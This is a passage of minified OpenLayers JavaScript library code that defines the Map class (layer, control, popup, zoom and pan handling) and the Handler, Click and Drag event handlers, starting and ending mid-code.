OpenLayers.Bounds(15,15,15,15);this.theme=OpenLayers._getScriptLocation()+\"theme/default/style.css\";this.options=OpenLayers.Util.extend({},b);OpenLayers.Util.extend(this,b);OpenLayers.Util.applyDefaults(this,OpenLayers.Projection.defaults[this.projection instanceof OpenLayers.Projection?this.projection.projCode:this.projection]);!this.maxExtent||this.maxExtent instanceof OpenLayers.Bounds||(this.maxExtent=new OpenLayers.Bounds(this.maxExtent));\n!this.minExtent||this.minExtent instanceof OpenLayers.Bounds||(this.minExtent=new OpenLayers.Bounds(this.minExtent));!this.restrictedExtent||this.restrictedExtent instanceof OpenLayers.Bounds||(this.restrictedExtent=new OpenLayers.Bounds(this.restrictedExtent));!this.center||this.center instanceof OpenLayers.LonLat||(this.center=new OpenLayers.LonLat(this.center));this.layers=[];this.id=OpenLayers.Util.createUniqueID(\"OpenLayers.Map_\");this.div=OpenLayers.Util.getElement(a);this.div||(this.div=document.createElement(\"div\"),\nthis.div.style.height=\"1px\",this.div.style.width=\"1px\");OpenLayers.Element.addClass(this.div,\"olMap\");var c=this.id+\"_OpenLayers_ViewPort\";this.viewPortDiv=OpenLayers.Util.createDiv(c,null,null,null,\"relative\",null,\"hidden\");this.viewPortDiv.style.width=\"100%\";this.viewPortDiv.style.height=\"100%\";this.viewPortDiv.className=\"olMapViewport\";this.div.appendChild(this.viewPortDiv);this.events=new OpenLayers.Events(this,this.viewPortDiv,null,this.fallThrough,{includeXY:!0});OpenLayers.TileManager&&null!==\nthis.tileManager&&(this.tileManager instanceof OpenLayers.TileManager||(this.tileManager=new OpenLayers.TileManager(this.tileManager)),this.tileManager.addMap(this));c=this.id+\"_OpenLayers_Container\";this.layerContainerDiv=OpenLayers.Util.createDiv(c);this.layerContainerDiv.style.zIndex=this.Z_INDEX_BASE.Popup-1;this.layerContainerOriginPx={x:0,y:0};this.applyTransform();this.viewPortDiv.appendChild(this.layerContainerDiv);this.updateSize();if(this.eventListeners instanceof Object)this.events.on(this.eventListeners);\n!0===this.autoUpdateSize&&(this.updateSizeDestroy=OpenLayers.Function.bind(this.updateSize,this),OpenLayers.Event.observe(window,\"resize\",this.updateSizeDestroy));if(this.theme){for(var c=!0,d=document.getElementsByTagName(\"link\"),e=0,f=d.length;e<f;++e)if(OpenLayers.Util.isEquivalentUrl(d.item(e).href,this.theme)){c=!1;break}c&&(c=document.createElement(\"link\"),c.setAttribute(\"rel\",\"stylesheet\"),c.setAttribute(\"type\",\"text/css\"),c.setAttribute(\"href\",this.theme),document.getElementsByTagName(\"head\")[0].appendChild(c))}null==\nthis.controls&&(this.controls=[],null!=OpenLayers.Control&&(OpenLayers.Control.Navigation?this.controls.push(new OpenLayers.Control.Navigation):OpenLayers.Control.TouchNavigation&&this.controls.push(new OpenLayers.Control.TouchNavigation),OpenLayers.Control.Zoom?this.controls.push(new OpenLayers.Control.Zoom):OpenLayers.Control.PanZoom&&this.controls.push(new OpenLayers.Control.PanZoom),OpenLayers.Control.ArgParser&&this.controls.push(new OpenLayers.Control.ArgParser),OpenLayers.Control.Attribution&&\nthis.controls.push(new OpenLayers.Control.Attribution)));e=0;for(f=this.controls.length;e<f;e++)this.addControlToMap(this.controls[e]);this.popups=[];this.unloadDestroy=OpenLayers.Function.bind(this.destroy,this);OpenLayers.Event.observe(window,\"unload\",this.unloadDestroy);b&&b.layers&&(delete this.center,delete this.zoom,this.addLayers(b.layers),b.center&&!this.getCenter()&&this.setCenter(b.center,b.zoom));this.panMethod&&(this.panTween=new OpenLayers.Tween(this.panMethod));this.zoomMethod&&this.applyTransform.transform&&\n(this.zoomTween=new OpenLayers.Tween(this.zoomMethod))},getViewport:function(){return this.viewPortDiv},render:function(a){this.div=OpenLayers.Util.getElement(a);OpenLayers.Element.addClass(this.div,\"olMap\");this.viewPortDiv.parentNode.removeChild(this.viewPortDiv);this.div.appendChild(this.viewPortDiv);this.updateSize()},unloadDestroy:null,updateSizeDestroy:null,destroy:function(){if(!this.unloadDestroy)return!1;this.panTween&&(this.panTween.stop(),this.panTween=null);this.zoomTween&&(this.zoomTween.stop(),\nthis.zoomTween=null);OpenLayers.Event.stopObserving(window,\"unload\",this.unloadDestroy);this.unloadDestroy=null;this.updateSizeDestroy&&OpenLayers.Event.stopObserving(window,\"resize\",this.updateSizeDestroy);this.paddingForPopups=null;if(null!=this.controls){for(var a=this.controls.length-1;0<=a;--a)this.controls[a].destroy();this.controls=null}if(null!=this.layers){for(a=this.layers.length-1;0<=a;--a)this.layers[a].destroy(!1);this.layers=null}this.viewPortDiv&&this.viewPortDiv.parentNode&&this.viewPortDiv.parentNode.removeChild(this.viewPortDiv);\nthis.viewPortDiv=null;this.tileManager&&(this.tileManager.removeMap(this),this.tileManager=null);this.eventListeners&&(this.events.un(this.eventListeners),this.eventListeners=null);this.events.destroy();this.options=this.events=null},setOptions:function(a){var b=this.minPx&&a.restrictedExtent!=this.restrictedExtent;OpenLayers.Util.extend(this,a);b&&this.moveTo(this.getCachedCenter(),this.zoom,{forceZoomChange:!0})},getTileSize:function(){return this.tileSize},getBy:function(a,b,c){var d=\"function\"==\ntypeof c.test;return OpenLayers.Array.filter(this[a],function(a){return a[b]==c||d&&c.test(a[b])})},getLayersBy:function(a,b){return this.getBy(\"layers\",a,b)},getLayersByName:function(a){return this.getLayersBy(\"name\",a)},getLayersByClass:function(a){return this.getLayersBy(\"CLASS_NAME\",a)},getControlsBy:function(a,b){return this.getBy(\"controls\",a,b)},getControlsByClass:function(a){return this.getControlsBy(\"CLASS_NAME\",a)},getLayer:function(a){for(var b=null,c=0,d=this.layers.length;c<d;c++){var e=\nthis.layers[c];if(e.id==a){b=e;break}}return b},setLayerZIndex:function(a,b){a.setZIndex(this.Z_INDEX_BASE[a.isBaseLayer?\"BaseLayer\":\"Overlay\"]+5*b)},resetLayersZIndex:function(){for(var a=0,b=this.layers.length;a<b;a++)this.setLayerZIndex(this.layers[a],a)},addLayer:function(a){for(var b=0,c=this.layers.length;b<c;b++)if(this.layers[b]==a)return!1;if(!1===this.events.triggerEvent(\"preaddlayer\",{layer:a}))return!1;this.allOverlays&&(a.isBaseLayer=!1);a.div.className=\"olLayerDiv\";a.div.style.overflow=\n\"\";this.setLayerZIndex(a,this.layers.length);a.isFixed?this.viewPortDiv.appendChild(a.div):this.layerContainerDiv.appendChild(a.div);this.layers.push(a);a.setMap(this);a.isBaseLayer||this.allOverlays&&!this.baseLayer?null==this.baseLayer?this.setBaseLayer(a):a.setVisibility(!1):a.redraw();this.events.triggerEvent(\"addlayer\",{layer:a});a.events.triggerEvent(\"added\",{map:this,layer:a});a.afterAdd();return!0},addLayers:function(a){for(var b=0,c=a.length;b<c;b++)this.addLayer(a[b])},removeLayer:function(a,\nb){if(!1!==this.events.triggerEvent(\"preremovelayer\",{layer:a})){null==b&&(b=!0);a.isFixed?this.viewPortDiv.removeChild(a.div):this.layerContainerDiv.removeChild(a.div);OpenLayers.Util.removeItem(this.layers,a);a.removeMap(this);a.map=null;if(this.baseLayer==a&&(this.baseLayer=null,b))for(var c=0,d=this.layers.length;c<d;c++){var e=this.layers[c];if(e.isBaseLayer||this.allOverlays){this.setBaseLayer(e);break}}this.resetLayersZIndex();this.events.triggerEvent(\"removelayer\",{layer:a});a.events.triggerEvent(\"removed\",\n{map:this,layer:a})}},getNumLayers:function(){return this.layers.length},getLayerIndex:function(a){return OpenLayers.Util.indexOf(this.layers,a)},setLayerIndex:function(a,b){var c=this.getLayerIndex(a);0>b?b=0:b>this.layers.length&&(b=this.layers.length);if(c!=b){this.layers.splice(c,1);this.layers.splice(b,0,a);for(var c=0,d=this.layers.length;c<d;c++)this.setLayerZIndex(this.layers[c],c);this.events.triggerEvent(\"changelayer\",{layer:a,property:\"order\"});this.allOverlays&&(0===b?this.setBaseLayer(a):\nthis.baseLayer!==this.layers[0]&&this.setBaseLayer(this.layers[0]))}},raiseLayer:function(a,b){var c=this.getLayerIndex(a)+b;this.setLayerIndex(a,c)},setBaseLayer:function(a){if(a!=this.baseLayer&&-1!=OpenLayers.Util.indexOf(this.layers,a)){var b=this.getCachedCenter(),c=OpenLayers.Util.getResolutionFromScale(this.getScale(),a.units);null==this.baseLayer||this.allOverlays||this.baseLayer.setVisibility(!1);this.baseLayer=a;if(!this.allOverlays||this.baseLayer.visibility)this.baseLayer.setVisibility(!0),\n!1===this.baseLayer.inRange&&this.baseLayer.redraw();null!=b&&(a=this.getZoomForResolution(c||this.resolution,!0),this.setCenter(b,a,!1,!0));this.events.triggerEvent(\"changebaselayer\",{layer:this.baseLayer})}},addControl:function(a,b){this.controls.push(a);this.addControlToMap(a,b)},addControls:function(a,b){for(var c=1===arguments.length?[]:b,d=0,e=a.length;d<e;d++)this.addControl(a[d],c[d]?c[d]:null)},addControlToMap:function(a,b){a.outsideViewport=null!=a.div;this.displayProjection&&!a.displayProjection&&\n(a.displayProjection=this.displayProjection);a.setMap(this);var c=a.draw(b);c&&!a.outsideViewport&&(c.style.zIndex=this.Z_INDEX_BASE.Control+this.controls.length,this.viewPortDiv.appendChild(c));a.autoActivate&&a.activate()},getControl:function(a){for(var b=null,c=0,d=this.controls.length;c<d;c++){var e=this.controls[c];if(e.id==a){b=e;break}}return b},removeControl:function(a){a&&a==this.getControl(a.id)&&(a.div&&a.div.parentNode==this.viewPortDiv&&this.viewPortDiv.removeChild(a.div),OpenLayers.Util.removeItem(this.controls,\na))},addPopup:function(a,b){if(b)for(var c=this.popups.length-1;0<=c;--c)this.removePopup(this.popups[c]);a.map=this;this.popups.push(a);if(c=a.draw())c.style.zIndex=this.Z_INDEX_BASE.Popup+this.popups.length,this.layerContainerDiv.appendChild(c)},removePopup:function(a){OpenLayers.Util.removeItem(this.popups,a);if(a.div)try{this.layerContainerDiv.removeChild(a.div)}catch(b){}a.map=null},getSize:function(){var a=null;null!=this.size&&(a=this.size.clone());return a},updateSize:function(){var a=this.getCurrentSize();\nif(a&&!isNaN(a.h)&&!isNaN(a.w)){this.events.clearMouseCache();var b=this.getSize();null==b&&(this.size=b=a);if(!a.equals(b)){this.size=a;a=0;for(b=this.layers.length;a<b;a++)this.layers[a].onMapResize();a=this.getCachedCenter();null!=this.baseLayer&&null!=a&&(b=this.getZoom(),this.zoom=null,this.setCenter(a,b))}}this.events.triggerEvent(\"updatesize\")},getCurrentSize:function(){var a=new OpenLayers.Size(this.div.clientWidth,this.div.clientHeight);if(0==a.w&&0==a.h||isNaN(a.w)&&isNaN(a.h))a.w=this.div.offsetWidth,\na.h=this.div.offsetHeight;if(0==a.w&&0==a.h||isNaN(a.w)&&isNaN(a.h))a.w=parseInt(this.div.style.width),a.h=parseInt(this.div.style.height);return a},calculateBounds:function(a,b){var c=null;null==a&&(a=this.getCachedCenter());null==b&&(b=this.getResolution());if(null!=a&&null!=b)var c=this.size.w*b/2,d=this.size.h*b/2,c=new OpenLayers.Bounds(a.lon-c,a.lat-d,a.lon+c,a.lat+d);return c},getCenter:function(){var a=null,b=this.getCachedCenter();b&&(a=b.clone());return a},getCachedCenter:function(){!this.center&&\nthis.size&&(this.center=this.getLonLatFromViewPortPx({x:this.size.w/2,y:this.size.h/2}));return this.center},getZoom:function(){return this.zoom},pan:function(a,b,c){c=OpenLayers.Util.applyDefaults(c,{animate:!0,dragging:!1});if(c.dragging)0==a&&0==b||this.moveByPx(a,b);else{var d=this.getViewPortPxFromLonLat(this.getCachedCenter());a=d.add(a,b);if(this.dragging||!a.equals(d))d=this.getLonLatFromViewPortPx(a),c.animate?this.panTo(d):(this.moveTo(d),this.dragging&&(this.dragging=!1,this.events.triggerEvent(\"moveend\")))}},\npanTo:function(a){if(this.panTween&&this.getExtent().scale(this.panRatio).containsLonLat(a)){var b=this.getCachedCenter();if(!a.equals(b)){var b=this.getPixelFromLonLat(b),c=this.getPixelFromLonLat(a),d=0,e=0;this.panTween.start({x:0,y:0},{x:c.x-b.x,y:c.y-b.y},this.panDuration,{callbacks:{eachStep:OpenLayers.Function.bind(function(a){this.moveByPx(a.x-d,a.y-e);d=Math.round(a.x);e=Math.round(a.y)},this),done:OpenLayers.Function.bind(function(b){this.moveTo(a);this.dragging=!1;this.events.triggerEvent(\"moveend\")},\nthis)}})}}else this.setCenter(a)},setCenter:function(a,b,c,d){this.panTween&&this.panTween.stop();this.zoomTween&&this.zoomTween.stop();this.moveTo(a,b,{dragging:c,forceZoomChange:d})},moveByPx:function(a,b){var c=this.size.w/2,d=this.size.h/2,e=c+a,f=d+b,g=this.baseLayer.wrapDateLine,h=0,k=0;this.restrictedExtent&&(h=c,k=d,g=!1);a=g||e<=this.maxPx.x-h&&e>=this.minPx.x+h?Math.round(a):0;b=f<=this.maxPx.y-k&&f>=this.minPx.y+k?Math.round(b):0;if(a||b){this.dragging||(this.dragging=!0,this.events.triggerEvent(\"movestart\"));\nthis.center=null;a&&(this.layerContainerOriginPx.x-=a,this.minPx.x-=a,this.maxPx.x-=a);b&&(this.layerContainerOriginPx.y-=b,this.minPx.y-=b,this.maxPx.y-=b);this.applyTransform();d=0;for(e=this.layers.length;d<e;++d)c=this.layers[d],c.visibility&&(c===this.baseLayer||c.inRange)&&(c.moveByPx(a,b),c.events.triggerEvent(\"move\"));this.events.triggerEvent(\"move\")}},adjustZoom:function(a){if(this.baseLayer&&this.baseLayer.wrapDateLine){var b=this.baseLayer.resolutions,c=this.getMaxExtent().getWidth()/this.size.w;\nif(this.getResolutionForZoom(a)>c)if(this.fractionalZoom)a=this.getZoomForResolution(c);else for(var d=a|0,e=b.length;d<e;++d)if(b[d]<=c){a=d;break}}return a},getMinZoom:function(){return this.adjustZoom(0)},moveTo:function(a,b,c){null==a||a instanceof OpenLayers.LonLat||(a=new OpenLayers.LonLat(a));c||(c={});null!=b&&(b=parseFloat(b),this.fractionalZoom||(b=Math.round(b)));var d=b;b=this.adjustZoom(b);b!==d&&(a=this.getCenter());var d=c.dragging||this.dragging,e=c.forceZoomChange;this.getCachedCenter()||\nthis.isValidLonLat(a)||(a=this.maxExtent.getCenterLonLat(),this.center=a.clone());if(null!=this.restrictedExtent){null==a&&(a=this.center);null==b&&(b=this.getZoom());var f=this.getResolutionForZoom(b),f=this.calculateBounds(a,f);if(!this.restrictedExtent.containsBounds(f)){var g=this.restrictedExtent.getCenterLonLat();f.getWidth()>this.restrictedExtent.getWidth()?a=new OpenLayers.LonLat(g.lon,a.lat):f.left<this.restrictedExtent.left?a=a.add(this.restrictedExtent.left-f.left,0):f.right>this.restrictedExtent.right&&\n(a=a.add(this.restrictedExtent.right-f.right,0));f.getHeight()>this.restrictedExtent.getHeight()?a=new OpenLayers.LonLat(a.lon,g.lat):f.bottom<this.restrictedExtent.bottom?a=a.add(0,this.restrictedExtent.bottom-f.bottom):f.top>this.restrictedExtent.top&&(a=a.add(0,this.restrictedExtent.top-f.top))}}e=e||this.isValidZoomLevel(b)&&b!=this.getZoom();f=this.isValidLonLat(a)&&!a.equals(this.center);if(e||f||d){d||this.events.triggerEvent(\"movestart\",{zoomChanged:e});f&&(!e&&this.center&&this.centerLayerContainer(a),\nthis.center=a.clone());a=e?this.getResolutionForZoom(b):this.getResolution();if(e||null==this.layerContainerOrigin){this.layerContainerOrigin=this.getCachedCenter();this.layerContainerOriginPx.x=0;this.layerContainerOriginPx.y=0;this.applyTransform();var f=this.getMaxExtent({restricted:!0}),h=f.getCenterLonLat(),g=this.center.lon-h.lon,h=h.lat-this.center.lat,k=Math.round(f.getWidth()/a),l=Math.round(f.getHeight()/a);this.minPx={x:(this.size.w-k)/2-g/a,y:(this.size.h-l)/2-h/a};this.maxPx={x:this.minPx.x+\nMath.round(f.getWidth()/a),y:this.minPx.y+Math.round(f.getHeight()/a)}}e&&(this.zoom=b,this.resolution=a);a=this.getExtent();this.baseLayer.visibility&&(this.baseLayer.moveTo(a,e,c.dragging),c.dragging||this.baseLayer.events.triggerEvent(\"moveend\",{zoomChanged:e}));a=this.baseLayer.getExtent();for(b=this.layers.length-1;0<=b;--b)f=this.layers[b],f===this.baseLayer||f.isBaseLayer||(g=f.calculateInRange(),f.inRange!=g&&((f.inRange=g)||f.display(!1),this.events.triggerEvent(\"changelayer\",{layer:f,property:\"visibility\"})),\ng&&f.visibility&&(f.moveTo(a,e,c.dragging),c.dragging||f.events.triggerEvent(\"moveend\",{zoomChanged:e})));this.events.triggerEvent(\"move\");d||this.events.triggerEvent(\"moveend\");if(e){b=0;for(c=this.popups.length;b<c;b++)this.popups[b].updatePosition();this.events.triggerEvent(\"zoomend\")}}},centerLayerContainer:function(a){var b=this.getViewPortPxFromLonLat(this.layerContainerOrigin),c=this.getViewPortPxFromLonLat(a);if(null!=b&&null!=c){var d=this.layerContainerOriginPx.x;a=this.layerContainerOriginPx.y;\nvar e=Math.round(b.x-c.x),b=Math.round(b.y-c.y);this.applyTransform(this.layerContainerOriginPx.x=e,this.layerContainerOriginPx.y=b);d-=e;a-=b;this.minPx.x-=d;this.maxPx.x-=d;this.minPx.y-=a;this.maxPx.y-=a}},isValidZoomLevel:function(a){return null!=a&&0<=a&&a<this.getNumZoomLevels()},isValidLonLat:function(a){var b=!1;null!=a&&(b=this.getMaxExtent(),b=b.containsLonLat(a,{worldBounds:this.baseLayer.wrapDateLine&&b}));return b},getProjection:function(){var a=this.getProjectionObject();return a?a.getCode():\nnull},getProjectionObject:function(){var a=null;null!=this.baseLayer&&(a=this.baseLayer.projection);return a},getMaxResolution:function(){var a=null;null!=this.baseLayer&&(a=this.baseLayer.maxResolution);return a},getMaxExtent:function(a){var b=null;a&&a.restricted&&this.restrictedExtent?b=this.restrictedExtent:null!=this.baseLayer&&(b=this.baseLayer.maxExtent);return b},getNumZoomLevels:function(){var a=null;null!=this.baseLayer&&(a=this.baseLayer.numZoomLevels);return a},getExtent:function(){var a=\nnull;null!=this.baseLayer&&(a=this.baseLayer.getExtent());return a},getResolution:function(){var a=null;null!=this.baseLayer?a=this.baseLayer.getResolution():!0===this.allOverlays&&0<this.layers.length&&(a=this.layers[0].getResolution());return a},getUnits:function(){var a=null;null!=this.baseLayer&&(a=this.baseLayer.units);return a},getScale:function(){var a=null;null!=this.baseLayer&&(a=this.getResolution(),a=OpenLayers.Util.getScaleFromResolution(a,this.baseLayer.units));return a},getZoomForExtent:function(a,\nb){var c=null;null!=this.baseLayer&&(c=this.baseLayer.getZoomForExtent(a,b));return c},getResolutionForZoom:function(a){var b=null;this.baseLayer&&(b=this.baseLayer.getResolutionForZoom(a));return b},getZoomForResolution:function(a,b){var c=null;null!=this.baseLayer&&(c=this.baseLayer.getZoomForResolution(a,b));return c},zoomTo:function(a,b){var c=this;if(c.isValidZoomLevel(a))if(c.baseLayer.wrapDateLine&&(a=c.adjustZoom(a)),c.zoomTween){var d=c.getResolution(),e=c.getResolutionForZoom(a),f={scale:1},\nd={scale:d/e};c.zoomTween.playing&&c.zoomTween.duration<3*c.zoomDuration?c.zoomTween.finish={scale:c.zoomTween.finish.scale*d.scale}:(b||(e=c.getSize(),b={x:e.w/2,y:e.h/2}),c.zoomTween.start(f,d,c.zoomDuration,{minFrameRate:50,callbacks:{eachStep:function(a){var d=c.layerContainerOriginPx;a=a.scale;c.applyTransform(d.x+((a-1)*(d.x-b.x)|0),d.y+((a-1)*(d.y-b.y)|0),a)},done:function(a){c.applyTransform();a=c.getResolution()/a.scale;var d=c.getZoomForResolution(a,!0);c.moveTo(c.getZoomTargetCenter(b,\na),d,!0)}}}))}else f=b?c.getZoomTargetCenter(b,c.getResolutionForZoom(a)):null,c.setCenter(f,a)},zoomIn:function(){this.zoomTo(this.getZoom()+1)},zoomOut:function(){this.zoomTo(this.getZoom()-1)},zoomToExtent:function(a,b){a instanceof OpenLayers.Bounds||(a=new OpenLayers.Bounds(a));var c=a.getCenterLonLat();if(this.baseLayer.wrapDateLine){c=this.getMaxExtent();for(a=a.clone();a.right<a.left;)a.right+=c.getWidth();c=a.getCenterLonLat().wrapDateLine(c)}this.setCenter(c,this.getZoomForExtent(a,b))},\nzoomToMaxExtent:function(a){a=this.getMaxExtent({restricted:a?a.restricted:!0});this.zoomToExtent(a)},zoomToScale:function(a,b){var c=OpenLayers.Util.getResolutionFromScale(a,this.baseLayer.units),d=this.size.w*c/2,c=this.size.h*c/2,e=this.getCachedCenter(),d=new OpenLayers.Bounds(e.lon-d,e.lat-c,e.lon+d,e.lat+c);this.zoomToExtent(d,b)},getLonLatFromViewPortPx:function(a){var b=null;null!=this.baseLayer&&(b=this.baseLayer.getLonLatFromViewPortPx(a));return b},getViewPortPxFromLonLat:function(a){var b=\nnull;null!=this.baseLayer&&(b=this.baseLayer.getViewPortPxFromLonLat(a));return b},getZoomTargetCenter:function(a,b){var c=null,d=this.getSize(),e=d.w/2-a.x,d=a.y-d.h/2,f=this.getLonLatFromPixel(a);f&&(c=new OpenLayers.LonLat(f.lon+e*b,f.lat+d*b));return c},getLonLatFromPixel:function(a){return this.getLonLatFromViewPortPx(a)},getPixelFromLonLat:function(a){a=this.getViewPortPxFromLonLat(a);a.x=Math.round(a.x);a.y=Math.round(a.y);return a},getGeodesicPixelSize:function(a){var b=a?this.getLonLatFromPixel(a):\nthis.getCachedCenter()||new OpenLayers.LonLat(0,0),c=this.getResolution();a=b.add(-c/2,0);var d=b.add(c/2,0),e=b.add(0,-c/2),b=b.add(0,c/2),c=new OpenLayers.Projection(\"EPSG:4326\"),f=this.getProjectionObject()||c;f.equals(c)||(a.transform(f,c),d.transform(f,c),e.transform(f,c),b.transform(f,c));return new OpenLayers.Size(OpenLayers.Util.distVincenty(a,d),OpenLayers.Util.distVincenty(e,b))},getViewPortPxFromLayerPx:function(a){var b=null;null!=a&&(b=a.add(this.layerContainerOriginPx.x,this.layerContainerOriginPx.y));\nreturn b},getLayerPxFromViewPortPx:function(a){var b=null;null!=a&&(b=a.add(-this.layerContainerOriginPx.x,-this.layerContainerOriginPx.y),isNaN(b.x)||isNaN(b.y))&&(b=null);return b},getLonLatFromLayerPx:function(a){a=this.getViewPortPxFromLayerPx(a);return this.getLonLatFromViewPortPx(a)},getLayerPxFromLonLat:function(a){a=this.getPixelFromLonLat(a);return this.getLayerPxFromViewPortPx(a)},applyTransform:function(a,b,c){c=c||1;var d=this.layerContainerOriginPx,e=1!==c;a=a||d.x;b=b||d.y;var f=this.layerContainerDiv.style,\ng=this.applyTransform.transform,h=this.applyTransform.template;if(void 0===g&&(g=OpenLayers.Util.vendorPrefix.style(\"transform\"),this.applyTransform.transform=g)){var k=OpenLayers.Element.getStyle(this.viewPortDiv,OpenLayers.Util.vendorPrefix.css(\"transform\"));k&&\"none\"===k||(h=[\"translate3d(\",\",0) \",\"scale3d(\",\",1)\"],f[g]=[h[0],\"0,0\",h[1]].join(\"\"));h&&~f[g].indexOf(h[0])||(h=[\"translate(\",\") \",\"scale(\",\")\"]);this.applyTransform.template=h}null===g||\"translate3d(\"!==h[0]&&!0!==e?(f.left=a+\"px\",f.top=\nb+\"px\",null!==g&&(f[g]=\"\")):(!0===e&&\"translate(\"===h[0]&&(a-=d.x,b-=d.y,f.left=d.x+\"px\",f.top=d.y+\"px\"),f[g]=[h[0],a,\"px,\",b,\"px\",h[1],h[2],c,\",\",c,h[3]].join(\"\"))},CLASS_NAME:\"OpenLayers.Map\"});OpenLayers.Map.TILE_WIDTH=256;OpenLayers.Map.TILE_HEIGHT=256;OpenLayers.Handler=OpenLayers.Class({id:null,control:null,map:null,keyMask:null,active:!1,evt:null,touch:!1,initialize:function(a,b,c){OpenLayers.Util.extend(this,c);this.control=a;this.callbacks=b;(a=this.map||a.map)&&this.setMap(a);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\"_\")},setMap:function(a){this.map=a},checkModifiers:function(a){return null==this.keyMask?!0:((a.shiftKey?OpenLayers.Handler.MOD_SHIFT:0)|(a.ctrlKey?OpenLayers.Handler.MOD_CTRL:0)|(a.altKey?OpenLayers.Handler.MOD_ALT:\n0)|(a.metaKey?OpenLayers.Handler.MOD_META:0))==this.keyMask},activate:function(){if(this.active)return!1;for(var a=OpenLayers.Events.prototype.BROWSER_EVENTS,b=0,c=a.length;b<c;b++)this[a[b]]&&this.register(a[b],this[a[b]]);return this.active=!0},deactivate:function(){if(!this.active)return!1;for(var a=OpenLayers.Events.prototype.BROWSER_EVENTS,b=0,c=a.length;b<c;b++)this[a[b]]&&this.unregister(a[b],this[a[b]]);this.active=this.touch=!1;return!0},startTouch:function(){if(!this.touch){this.touch=!0;\nfor(var a=\"mousedown mouseup mousemove click dblclick mouseout\".split(\" \"),b=0,c=a.length;b<c;b++)this[a[b]]&&this.unregister(a[b],this[a[b]])}},callback:function(a,b){a&&this.callbacks[a]&&this.callbacks[a].apply(this.control,b)},register:function(a,b){this.map.events.registerPriority(a,this,b);this.map.events.registerPriority(a,this,this.setEvent)},unregister:function(a,b){this.map.events.unregister(a,this,b);this.map.events.unregister(a,this,this.setEvent)},setEvent:function(a){this.evt=a;return!0},\ndestroy:function(){this.deactivate();this.control=this.map=null},CLASS_NAME:\"OpenLayers.Handler\"});OpenLayers.Handler.MOD_NONE=0;OpenLayers.Handler.MOD_SHIFT=1;OpenLayers.Handler.MOD_CTRL=2;OpenLayers.Handler.MOD_ALT=4;OpenLayers.Handler.MOD_META=8;OpenLayers.Handler.Click=OpenLayers.Class(OpenLayers.Handler,{delay:300,single:!0,\"double\":!1,pixelTolerance:0,dblclickTolerance:13,stopSingle:!1,stopDouble:!1,timerId:null,down:null,last:null,first:null,rightclickTimerId:null,touchstart:function(a){this.startTouch();this.down=this.getEventInfo(a);this.last=this.getEventInfo(a);return!0},touchmove:function(a){this.last=this.getEventInfo(a);return!0},touchend:function(a){this.down&&(a.xy=this.last.xy,a.lastTouches=this.last.touches,this.handleSingle(a),\nthis.down=null);return!0},mousedown:function(a){this.down=this.getEventInfo(a);this.last=this.getEventInfo(a);return!0},mouseup:function(a){var b=!0;this.checkModifiers(a)&&(this.control.handleRightClicks&&OpenLayers.Event.isRightClick(a))&&(b=this.rightclick(a));return b},rightclick:function(a){if(this.passesTolerance(a)){if(null!=this.rightclickTimerId)return this.clearTimer(),this.callback(\"dblrightclick\",[a]),!this.stopDouble;a=this[\"double\"]?OpenLayers.Util.extend({},a):this.callback(\"rightclick\",\n[a]);a=OpenLayers.Function.bind(this.delayedRightCall,this,a);this.rightclickTimerId=window.setTimeout(a,this.delay)}return!this.stopSingle},delayedRightCall:function(a){this.rightclickTimerId=null;a&&this.callback(\"rightclick\",[a])},click:function(a){this.last||(this.last=this.getEventInfo(a));this.handleSingle(a);return!this.stopSingle},dblclick:function(a){this.handleDouble(a);return!this.stopDouble},handleDouble:function(a){this.passesDblclickTolerance(a)&&(this[\"double\"]&&this.callback(\"dblclick\",\n[a]),this.clearTimer())},handleSingle:function(a){this.passesTolerance(a)&&(null!=this.timerId?(this.last.touches&&1===this.last.touches.length&&(this[\"double\"]&&OpenLayers.Event.preventDefault(a),this.handleDouble(a)),this.last.touches&&2===this.last.touches.length||this.clearTimer()):(this.first=this.getEventInfo(a),a=this.single?OpenLayers.Util.extend({},a):null,this.queuePotentialClick(a)))},queuePotentialClick:function(a){this.timerId=window.setTimeout(OpenLayers.Function.bind(this.delayedCall,\nthis,a),this.delay)},passesTolerance:function(a){var b=!0;if(null!=this.pixelTolerance&&this.down&&this.down.xy&&(b=this.pixelTolerance>=this.down.xy.distanceTo(a.xy))&&this.touch&&this.down.touches.length===this.last.touches.length){a=0;for(var c=this.down.touches.length;a<c;++a)if(this.getTouchDistance(this.down.touches[a],this.last.touches[a])>this.pixelTolerance){b=!1;break}}return b},getTouchDistance:function(a,b){return Math.sqrt(Math.pow(a.clientX-b.clientX,2)+Math.pow(a.clientY-b.clientY,\n2))},passesDblclickTolerance:function(a){a=!0;this.down&&this.first&&(a=this.down.xy.distanceTo(this.first.xy)<=this.dblclickTolerance);return a},clearTimer:function(){null!=this.timerId&&(window.clearTimeout(this.timerId),this.timerId=null);null!=this.rightclickTimerId&&(window.clearTimeout(this.rightclickTimerId),this.rightclickTimerId=null)},delayedCall:function(a){this.timerId=null;a&&this.callback(\"click\",[a])},getEventInfo:function(a){var b;if(a.touches){var c=a.touches.length;b=Array(c);for(var d,\ne=0;e<c;e++)d=a.touches[e],b[e]={clientX:d.olClientX,clientY:d.olClientY}}return{xy:a.xy,touches:b}},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&&(this.clearTimer(),this.last=this.first=this.down=null,a=!0);return a},CLASS_NAME:\"OpenLayers.Handler.Click\"});OpenLayers.Handler.Drag=OpenLayers.Class(OpenLayers.Handler,{started:!1,stopDown:!0,dragging:!1,last:null,start:null,lastMoveEvt:null,oldOnselectstart:null,interval:0,timeoutId:null,documentDrag:!1,documentEvents:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);if(!0===this.documentDrag){var d=this;this._docMove=function(a){d.mousemove({xy:{x:a.clientX,y:a.clientY},element:document})};this._docUp=function(a){d.mouseup({xy:{x:a.clientX,y:a.clientY}})}}},\ndragstart:function(a){var b=!0;this.dragging=!1;this.checkModifiers(a)&&(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))?(this.started=!0,this.last=this.start=a.xy,OpenLayers.Element.addClass(this.map.viewPortDiv,\"olDragDown\"),this.down(a),this.callback(\"down\",[a.xy]),OpenLayers.Event.preventDefault(a),this.oldOnselectstart||(this.oldOnselectstart=document.onselectstart?document.onselectstart:OpenLayers.Function.True),document.onselectstart=OpenLayers.Function.False,b=!this.stopDown):\n(this.started=!1,this.last=this.start=null);return 